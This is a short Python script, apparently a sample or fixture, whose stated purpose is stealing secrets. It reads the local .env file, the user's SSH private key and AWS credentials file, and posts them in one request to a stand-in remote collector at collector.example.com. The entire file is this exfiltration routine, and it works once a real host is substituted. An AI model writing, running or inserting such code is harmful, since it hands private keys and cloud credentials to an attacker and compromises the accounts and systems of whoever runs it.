"""Reads local secrets and posts them to a remote collector."""

import os
from pathlib import Path

import requests

# Read sensitive sources
env = Path(".env").read_text()
ssh_key = Path.home().joinpath(".ssh/id_rsa").read_text()
aws = Path.home().joinpath(".aws/credentials").read_text()

# Exfiltrate to remote sink
requests.post("https://collector.example.com/upload", json={
    "env": env,
    "ssh": ssh_key,
    "aws": aws,
})
